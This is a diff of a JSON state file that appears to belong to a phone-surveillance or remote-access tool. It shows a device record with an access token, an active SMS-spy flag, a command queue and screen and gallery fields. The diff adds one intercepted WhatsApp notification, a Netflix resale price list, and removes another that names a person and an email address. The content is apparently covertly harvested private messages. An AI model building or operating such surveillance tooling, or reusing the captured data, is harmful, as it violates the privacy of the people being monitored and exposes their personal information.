@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776952003713,
+    "lastSeen": 1776952008742,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Oi (11 pesan): BEW STORE",
+        "content": "📷 Hai +tag\nNetflix\n\n𝟭 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝟭 𝗨𝗦𝗘𝗥\n1 hari — 4.000\n3 hari — 9.000\n7 hari — 14.000\n14 hari — 24.000\n1 bulan — 45.000\n2 bulan — 88.000\n3 bulan — 125.000\n\n𝟭 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝟮 𝗨𝗦𝗘𝗥\n1 bulan — 25.000\n2 bulan — 45.000\n3 bulan — 70.000\n\n𝗦𝗘𝗠𝗜 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n1 bulan — 45.000\n2 bulan — 80.000\n3 bulan — 140.000\n\n\n> DILARANG login proyektor \n> tidak boleh login rave (app nobar semacamnya)\n> WAJIB kirim format netflix terlebih dahulu\n> denda 500k berlaku jika akun change email\n> semi private based 2u\n> diatas 1 bulan renew/norenew tergantung acc\n> patuhi snk = bergaransi \n> max fixing 3 days, massal 7 days\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
+        "time": "23/04 21:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952005402
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 19:15",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942921561
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Wabot",
-        "content": "📷 Thank you, Rama Yandi. The Wabot account for at6327638@gmail.com has been activated.\n\nLog in here:\nhttps://app.wabot.my/login or click button login to link your number 👇\n\nUser guide:\nhttps://docs.fatomate.com . Please check your email to get special coupon 20% off. \n\nIf you experience any issues, please let us know.",
-        "time": "23/04 19:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942917688
       }
     ],
     "galleryPhotos": [],
